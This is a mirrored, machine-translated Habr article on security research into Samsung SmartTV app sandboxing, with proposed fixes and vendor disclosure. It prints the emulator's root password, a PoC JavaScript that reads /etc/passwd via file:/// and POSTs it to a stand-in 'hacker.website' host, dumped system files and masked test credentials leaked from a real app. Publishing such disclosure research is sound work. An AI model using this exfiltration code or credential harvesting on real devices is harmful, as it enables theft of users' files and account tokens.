<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>SmartTV * - how to create an unsafe device in the modern world</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="* - the article will discuss only Samsung SmartTV 


 Image from mnn.com 

 ‚ÄúIf you‚Äôre on the third party‚Äôs report?‚Äù 
 Privacy Statement Samsung Smart...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>SmartTV * - how to create an unsafe device in the modern world</h1><div class="post__text post__text-html js-mediator-article">  <i>* - the article will discuss only Samsung SmartTV</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0f7/4bc/5d9/0f74bc5d9fb24e7f70588237e65b6061.jpg" alt="image"><br>  <i>Image from mnn.com</i> <br><br><blockquote>  ‚ÄúIf you‚Äôre on the third party‚Äôs report?‚Äù </blockquote><br>  Privacy Statement Samsung SmartTV ( <a href="http://news.samsung.com/global/samsung-smart-tvs-do-not-monitor-living-room-conversations">until February 2015</a> ) 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <blockquote>  The telescreen received and simultaneously.  If you‚Äôve made it, it‚Äôs not a problem;  He could be seen as well as heard.  There was no reason for you to be watched at any given moment.  How often, was it guessing. </blockquote><br>  <i>"1984" - George Orwell's dystopia novel, published in 1949</i> <br><br><h1>  Introduction </h1><br>  Just last week, the ZeroNights conference, about which we wrote so much on Habr√© (the final report has not yet been published, must be added).  And among other things, there I read a report about the Samsung SmartTV, telling what could be if the design of such multimedia platforms is guided intuitively by the closest and easiest solutions (let's open this topic in great detail).  The narrative format was chosen chronological, i.e.  how I looked and how I worked through the solution, if I were an engineer of such a device. <br><a name="habracut"></a><br>  The idea to watch SmartTV was planted on me, Samsung was chosen because of its greatest popularity in the market.  As it turned out, the topic has already been disclosed: <br><br><ul><li>  <a href="http://samygo.tv/">samygo.tv</a> </li><li>  <a href="https://media.blackhat.com/us-13/US-13-Lee-Hacking-Surveilling-and-Deceiving-Victims-on-Smart-TV-Slides.pdf">media.blackhat.com/us-13/US-13-Lee-Hacking-Surveilling-and-Deceiving-Victims-on-Smart-TV-Slides.pdf</a> </li><li>  <a href="http://community.hpe.com/t5/Security-Research/Hacking-my-smart-TV-an-old-new-thing/ba-p/6645844">community.hpe.com/t5/Security-Research/Hacking-my-smart-TV-an-old-new-thing/ba-p/6645844#.VKHH9AIqA</a> </li><li>  <a href="http://www.delaat.net/rp/2012-2013/p39/report.pdf">www.delaat.net/rp/2012-2013/p39/report.pdf</a> </li><li>  <a href="http://marcoramilli.blogspot.ru/2013/05/firmware-hacking-samsung-smart-tv-turn.html">marcoramilli.blogspot.ru/2013/05/firmware-hacking-samsung-smart-tv-turn.html</a> </li><li>  ... </li></ul><br>  Those.  already and remotely (!) rutali (recording data from cameras and microphones), the network protocols were disassembled, and indeed they covered the topic very well.  At the same time, I began to notice that everyone advised to turn off auto-updates, fixes are coming out, which means that Samsung doesn‚Äôt score bugs and monitor this topic. <br><br>  There were also strange presentations at serious conferences that threw dust in my eyes, I can mention <a href="http://www.rsaconference.com/writable/presentations/file_upload/ht-r08-how-hackers-are-outsmarting-smart-tvs-and-why-it-matters-to-you_copy1.pdf">www.rsaconference.com/writable/presentations/file_upload/ht-r08-how-hackers-are-outsmarting-smart-tvs-and-why-it- matters-to-you_copy1.pdf</a> with RSA, where the authors did not find a single vulnerability, pondered over the risks, how you can easily and easily break everything with the old software (including the browser), but something was silent about the subject of writing shellcodes and did not bring any proof of concept (so a complete failure).  News with beautiful pictures like <a href="http://habrahabr.ru/company/ua-hosting/blog/271831/">this, extortionists on SmartTV</a> , made it clear that some want to use the platform to sell their solution. <br><br>  Having learned that applications for SmartTV are being created on HTML / CSS / JS, I certainly began to search for reports on this topic.  But their ... no!  Then I decided to understand the topic. <br><br>  First decided on the model range, it is divided into two categories: <br><br><ul><li>  2008-2014 - A, B, C, D, E, F, H (Bada) - almost any model can be tampered (may depend on the installed patches), a lot of ways to install applications not from the market </li><li>  2015+ - J (Tizen) - the most recent model.  There are no publicly known ways of rutting the device, so while the topic is not covered.  But you can already install your applications </li></ul><br><br><h1>  Interaction architecture </h1><br>  Somewhere inside of me, realizing that the principle of operation of applications under SmartTV should be similar to the work of extensions in the browser (a set of API access rules, different origin, etc.) began to google it.  But found only something like this <br><br><img src="https://habrastorage.org/getpro/habr/post_images/c38/c0e/694/c38c0e694c6ff4e1a83df427d915b6cf.jpg" alt="image"><br><br>  What was a little strange, because it is typical for any system that directly works with ordinary dynamic content, without an additional API.  It didn‚Äôt work to find everything that was expected to work with extensions and the answer was found a little later. <br><br><h1>  Applications </h1><br>  Having raised the topic of applications and already starting to dive into it, it is time to write something of their own.  A typical SmartTV application is a ‚Äúregular‚Äù single-page site (Single Page Application) that has access to the Low-level API (i.e., a set of additional javascript functions that can also be called like all others). <br><br>  The application consists of HTML / JS / CSS files, in addition, there are XML and JSON (mostly - meta-information).  But in general - any static. <br><br>  Samsung provides an emulator for developers in a rather interesting way!  Includes VirtualBox machine <br><br><ul><li>  <a href="https://www.samsungdforum.com/Devtools/SdkDownload">www.samsungdforum.com/Devtools/SdkDownload</a> - SDK Emulator (5.1, 2014) </li><li>  Ubuntu 12.04.2 LTS </li><li>  Linux smarttvemulator 3.2.0-41 </li><li>  1 GB RAM / 8 GB HDD </li><li>  You can run your applications, but all APIs are available. </li><li>  Everything works as root (it turned out later) </li></ul><br><br>  And offers to expose a couple of shared directories with the host system where you want to place your applications. <br><img src="https://habrastorage.org/files/4c2/641/3a1/4c26413a10334c98b90fb2ab857c1776.png"><br>  <i>Launched Samsung SmartTV Emulator</i> <br><br>  Very interesting decision, no longer give any access.  After downloading some ready-made widget on the Internet, copied it into the Apps folder, launched it - it works.  It is time to see the debugging of it and the logical desire was to log in via ssh, but for some reason I did not see the password from it anywhere (on the download page). <br><br>  Began to google, first, second page ... Nowhere.  I came across an article just on my topic (it seems the only one) - <a href="https://mherfurt.wordpress.com/2014/10/10/auditing-samsung-smart-tv-apps/">mherfurt.wordpress.com/2014/10/10/auditing-samsung-smart-tv-apps</a> , but he writes <br><br><blockquote>  Unfortunately, there is no need for a smart phone. </blockquote><br><br>  If such a thing - find it yourself <br><ul><li>  Mount the emulator disk on another Linux system (I mounted it on another virtual machine) </li><li>  We are looking for a password </li></ul><br><br>  First way <br>  one. <pre><code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># cat /etc/shadow root:g4KfRyC9MkXuM:16177:0:99999:7:::</span></span></code> </pre> <br>  2. hashcat <br>  3. <b>1q2w3E</b> <br><br>  Second way: <br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># grep -r mkpasswd . ./checkAndLaunchEmulator.sh: [ -f /home/smarttv/Installer/.releaseOVAFlag ] &amp;&amp; usermod smarttv -p `mkpasswd 1q2w3E` &amp;&amp; cp -f .xinitrc.r .xinitrc &amp;&amp; usermod root -p `mkpasswd 1q2w3E`</span></span></code> </pre><br><br>  Ok, now let's make sure that the password is finally googled and was on the first pages. <br><br><h1>  SAMSUNG SMART TV EMULATOR ROOT PASS IS 1q2w3E </h1><br><br>  Now we have a virtual machine with applications from the host system, the files of which are open in Sublime and root to the emulator.  After launching the finished application and removing everything unnecessary from it (although you can take a blank application from Samsung - <a href="https://www.samsungdforum.com/Guide/art00011/index.html">www.samsungdforum.com/Guide/art00011/index.html</a> ) we go to explore the system, how applications work and what pitfalls can be. <br><br><h1>  Work with file system </h1><br>  From the point of view of an attacker, the first thing you want to access (well, except for RCE) is access to the file system and to someone else's data.  And to work with it there is a special class - FileSystem.  Code example: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> fileSystemObj = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileSystem(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> fileObj = fileSystemObj.openCommonFile(curWidget.id + <span class="hljs-string"><span class="hljs-string">'/testFile.data'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> strResult = fileObj.readAll();</code> </pre><br>  It looks fine, but ... what curWidget.id?  Logically, this is the current application folder.  But why transfer it?  Can we open the file in the root of the repository?  Or ... open the repository of <b>another</b> application?  As it turned out, yes, and it seems there is even a hint in the documentation.  We also check access to some / etc / passwd through ../../../../, but nothing comes out. <br><br>  After downloading the VK application for SmartTV, I decided to see where it would save its secret oauth token.  As it turned out, just in my own folder exactly according to the algorithm above!  The result, our vector: <br><br><ul><li>  The victim has an application from any social.  network, which stores a secret token through shared storage (for example, how it happened in VK) </li><li>  The victim installs our application </li><li>  Our app steals a secret OAuth token </li></ul><br>  Decision?  Store the token in the same localStorage. <br>  The result - account hijacking.  I decided to talk on this topic with the developers of the VC application and they said that localStorage is not all models, so this is a fallback (but they have provided the appropriate check).  As it turns out - it will not save them (as a whole, developers) :) <br><br>  Fix for Samsung? <br><ul><li>  When installing each application, create a new user in the system (with an auto-incremental id, such as widget12345, like on Android) </li><li>  Do not change the API for backward compatibility, but run each application under its user and curWidget.id folder to assign the correct chmod / chown rights.  And the developers say - keep secret data only in your folder.  If you need to share data with other applications - write to the root. </li></ul><br><br>  There is also an API for accessing <br><ul><li>  Microphone </li><li>  Cameras </li><li>  SmartHome technology that allows you to combine all devices into one network </li><li>  Network (get / set) </li><li>  Gestures </li><li>  And other low-level features </li></ul><br><br>  But I decided to switch and understand where we all run our applications. <br><br><h1>  Same Origin Policy </h1><br>  It is these three main words and their meaning that every web developer needs to understand.  Making a banal <br><br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.write(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location)</code> </pre><br>  I received an address of the form <i>file: ///mtd_down/widgets/user/XXX/index.html? Country = RU</i> and saw the scheme file: /// was terribly surprised.  We run an HTML page with arbitrary JS and every developer knows about it under SmartTV!  6 years!  Why did no one beat the alarm?  To the topic - executing JS we have access only to the current Origin, and in this case with file: /// - to the entire file system.  In modern browsers there is a crutch (NS_ERROR_DOM_BAD_URI: Access to restricted URI denied), which prohibits it, but here it is not.  Those.  Any widget has access to the file system (via ajax requests) under the user, under which the browser is running. <br><br>  Having written a small PoC, which would send data from the TV to my external server <br><br><pre> <code class="javascript hljs">file = <span class="hljs-string"><span class="hljs-string">'file:///etc/passwd'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> rawFile = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> XMLHttpRequest(); rawFile.open(<span class="hljs-string"><span class="hljs-string">"GET"</span></span>, file, <span class="hljs-literal"><span class="hljs-literal">false</span></span>); rawFile.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(rawFile.readyState === <span class="hljs-number"><span class="hljs-number">4</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(rawFile.status === <span class="hljs-number"><span class="hljs-number">200</span></span> || rawFile.status == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> allText = rawFile.responseText; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"http://hacker.website/smarttv/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> params = <span class="hljs-string"><span class="hljs-string">"file="</span></span>+file+<span class="hljs-string"><span class="hljs-string">"&amp;content="</span></span>+allText; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> xhr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> XMLHttpRequest(); xhr.open(<span class="hljs-string"><span class="hljs-string">"POST"</span></span>, url, <span class="hljs-literal"><span class="hljs-literal">true</span></span>); xhr.setRequestHeader(<span class="hljs-string"><span class="hljs-string">"Content-type"</span></span>, <span class="hljs-string"><span class="hljs-string">"application/x-www-form-urlencoded"</span></span>); xhr.send(params); } } } rawFile.send(<span class="hljs-literal"><span class="hljs-literal">null</span></span>);</code> </pre><br><br>  Began to test it.  The result is that the / etc / shadow was successfully read on the emulator (as well as under the root), and on a real TV all the common files. <br><br><img src="https://habrastorage.org/files/b23/041/c4a/b23041c4a87e4868b7da309226cad953.png"><br>  <i>We test on the emulator.</i>  <i>For clarity, we will display the contents of / etc / shadow on the screen.</i> <br><br>  Television <br>  <b>file: /// etc / passwd</b> <br><pre> <code class="hljs ruby">root::<span class="hljs-number"><span class="hljs-number">0</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">0</span></span><span class="hljs-symbol"><span class="hljs-symbol">:Root</span></span>,,,<span class="hljs-symbol"><span class="hljs-symbol">:/</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/bin/sh</span></span> app::<span class="hljs-number"><span class="hljs-number">1010</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">1010</span></span><span class="hljs-symbol"><span class="hljs-symbol">:app</span></span>,,,<span class="hljs-symbol"><span class="hljs-symbol">:/</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/bin/sh</span></span> webapp::<span class="hljs-number"><span class="hljs-number">1011</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">1011</span></span><span class="hljs-symbol"><span class="hljs-symbol">:webapp</span></span>,,,<span class="hljs-symbol"><span class="hljs-symbol">:/</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/bin/sh</span></span></code> </pre><br>  <b>file: /// etc / group</b> <br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">root</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::0</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:0</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">app</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::1010</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:app</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">webapp</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::1011</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:webapp</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">gfx</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::500</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:app</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">webapp</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">video</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::501</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:app</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">webapp</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">audio</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::502</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:app</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">webapp</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">disk</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::503</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:app</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">webapp</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">security</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::504</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:app</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">webapp</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">camera</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::505</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:505</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">dtvlogd</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">::506</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:app</span></span></code> </pre><br><br>  Delving into the problem with SOP - we read both system files and cookies / localStorage (binary files are read in the same way) of applications, going beyond the restriction of FileSystem (). <br><br>  As a result, the problem is that developers do not have a secure storage of secret data (such as OAuth tokens).  And here is a reference to the title and the beginning of the article and report. <br><br>  Fix for Samsung? <br><ul><li>  When installing each application, create a new user in the system (with an auto-incremental id, such as widget12345, as in the paragraph with FileSystem) </li><li>  Add a small DNS server that will handle the zone of the * .smartlocal type and wrap all domains to 127.0.0.1, proxying other requests through the system DNS server.  Or just hard-code it right in the browser. </li><li>  Use the already installed lighttpd to resolve this zone (hend virtual hosts and give statics) </li><li>  Run each widget in isolated Origin, view <br><ul><li>  <a href="http://widgetid123456.smartlocal/">widgetid123456.smartlocal</a> </li><li>  <a href="http://widgetid145356.smartlocal/">widgetid145356.smartlocal</a> </li><li>  <a href="http://widgetid7777.smartlocal/">widgetid7777.smartlocal</a> </li></ul></li></ul><br>  It is more secure and will solve the problem.  Or follow the Chromium path with extensions - its own scheme with its large and extensive API. <br><br>  Ways to introduce evil JS? <br><ul><li>  Imagine an application that passed the review in the market and loads an external JS (&lt;script src = "http: ///"&gt; &lt;/ script&gt;).  After successful moderation, the author replaces the executable code to all users.  Just paradise (: </li><li>  MitM when loading data via HTTP </li><li>  Or ... XSS attack.  After all, this is a banal web application! </li></ul><br><br>  And with XSS is really fun.  Having carried out the attack, we not only get access to the Low Level API, but also to the file system, trying to download files from the TV faster%) Here, only the DOM XSS for social applications are possible.  networks and the like. <br><br><h1>  Application Vulnerabilities </h1><br>  Having understood what we are dealing with, let's talk about the problems of the applications themselves, which are written by the developers.  I rather fluently looked at each application, but in each something was found from the list: <br><br><ul><li>  XSS, about which we have already talked.  Since we have a regular SPA application and if we find a way to conduct an XSS attack, we get access to the extra API (and access to different hardware) / file system and the ability to steal secret tokens / internal IP addresses (by reading system files) / and t .d  Scan the local network (http://ba.net/util/nmap/nmap.html), attack routers (routerpwn.com), etc. </li><li>  Information leaks (developer servers, where test versions of applications are located, internal IP, etc.) </li><li>  Some of the HTML5 problems, but I confess honestly that they probably won't work in real conditions. </li><li>  Insecure data transfer (HTTP + MitM) </li></ul><br><br>  And developers do not have the ability to charge their application with the same CSP. <br><br>  Let me give you a real example with information leaks.  It is necessary to check all the files of the application (enough banal grep'a).  In one of the applications it turned out to find test accounts ... <br><br><pre> <code class="javascript hljs"> someObject.id = <span class="hljs-string"><span class="hljs-string">"samsung*****@gmail.com"</span></span>; someObject.pw = <span class="hljs-string"><span class="hljs-string">"deXXXXX"</span></span>; someObject.id = <span class="hljs-string"><span class="hljs-string">"*********dev@gmail.com"</span></span>; someObject.pw = <span class="hljs-string"><span class="hljs-string">"tjXXXXX"</span></span>;</code> </pre><br><br>  To validate the API.  They came up to facebook <br><br><img src="https://habrastorage.org/files/e1b/c40/85c/e1bc4085cd6e41af836802e78916dfb1.png"><br>  <i>They hint to me that I‚Äôm coming in from an unusual account location</i> <br><br>  By the way, on the screenshot above, you can see that the mobile version is being used.  In the desktop version, it simply does not show in this situation, by whom, we log in (and here from below - ‚ÄúNot Kim?‚Äù). <br><br>  We draw some conclusions.  If you have a SmartTV: <br><ul><li>  Do not put widgets from Vasyan </li><li>  Got a root?  Use intelligently.  Including check the way you got it </li><li>  Believe that all applications are written without vulnerabilities and will load extra code on day X :) </li></ul><br>  Developer?  Do not try to prove that you are writing only the front and you have a banal SPA, and the backeders should deal with security.  Write so that there are no vulnerabilities (in general, about an insecure frontend wrote earlier - <a href="http://habrahabr.ru/company/dsec/blog/259389/">habrahabr.ru/company/dsec/blog/259389</a> ) <br><br><h1>  Conclusion </h1><br><ul><li>  There is no possibility to store files in a secret way (walking to fence the secret id for the name of the tokens as a whole can complicate the task to the attacker) </li><li>  Allowed a place for XSS attacks will create more problems than usual </li><li>  Application developers are not yet thinking about the security of their applications. </li><li>  Believe that the market review will not miss the evil application that will load the code from an external resource.  Even if Samsung (and not only they) accept the policy of not skipping applications with external &lt;script src = "http: ///"&gt; &lt;/ script&gt;, attackers can always allow XSS in their own application and implement the code in this way </li><li>  This material should be updated as soon as I have Tizen.  I tried to find someone with Tizen, but among my acquaintances there were none. </li></ul><br>  It is worth noting that Samsung was aware of the whole situation and we talked with them on all points in the article.  They have already fixed the problem with Siz in Tizen (they say so, but I can‚Äôt check it myself yet) and deal with other issues, releasing updates for TVs on Bada, therefore, as a whole, only a plus, at least for the fact that they are the only ones who pay for vulnerabilities (from $ 1000) in their televisions (in my case, about the problem with SOP and other things were already up to date, therefore not qualified). <br><br>  The article including how an intuitively simple solution (launching applications through file: ///) at the very beginning can lead to a bunch of problems that are not so easy to solve when the device line is expanded, and almost the only solution (and many other problems that were architecturally allowed back in 2008) is moving to another OS.  And such problems can be not only with smart TVs, but also with machines, refrigerators, etc., because integrating the web for everyone and letting them write applications using web technologies is the simplest solution. <br><br>  After the report there were many questions that I did not cover in the article (recording of the report will be available). <br><br>  And the last - I do not have and never had a SmartTV.  All experiments on real hardware were conducted by a colleague and looked like this. <br><img src="https://habrastorage.org/getpro/habr/post_images/cbc/940/40c/cbc94040c8f3c46edbed12b65753f84d.jpg" alt="image"></div><p>Source: <a href="https://habr.com/ru/post/272017/">https://habr.com/ru/post/272017/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../272007/index.html">NextCastle Party 2015: how I showed my game</a></li>
<li><a href="../272009/index.html">About the report of Kirill Tolkachev and Alexander Tarasov about microservices on jug.msk.ru</a></li>
<li><a href="../272011/index.html">Six things you need to know about moving WordPress to JavaScript.</a></li>
<li><a href="../272013/index.html">How many times have I not abandoned the development of my second game</a></li>
<li><a href="../272015/index.html">Paranoid job: disaster recovery / continuity plans, meteorite, zombie apocalypse, 1000 cleaners, portal to hell</a></li>
<li><a href="../272023/index.html">IBM launched cloud authentication service Identity Mixer</a></li>
<li><a href="../272025/index.html">Java Programmer Cheat Sheet 5. Two hundred and fifty Russian-language training video presentations and lectures on Java</a></li>
<li><a href="../272031/index.html">AllcountJS: Making a system for point of sale (POS)</a></li>
<li><a href="../272033/index.html">Welcome to Web Standards Day in Moscow, December 13</a></li>
<li><a href="../272035/index.html">Did you receive a-mail? .. Accounting mail</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>